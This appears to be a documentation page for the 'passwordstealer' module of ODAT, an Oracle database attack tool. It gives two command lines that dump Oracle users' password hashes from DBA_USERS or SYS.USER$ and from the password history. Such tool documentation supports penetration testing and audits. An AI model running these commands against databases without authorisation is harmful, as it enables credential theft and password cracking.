# Get Oracle hashed passwords

This module has been created for getting hashed password of Oracle users quickly (in DBA_USERS or SYS.USER$) and hashed passwords from the history.

* To get hashed passwords from the history:
```bash
./odat.py passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --get-passwords-from-history
```

* To get hashed passwords from the users table:
```bash
./odat.py passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --get-passwords
```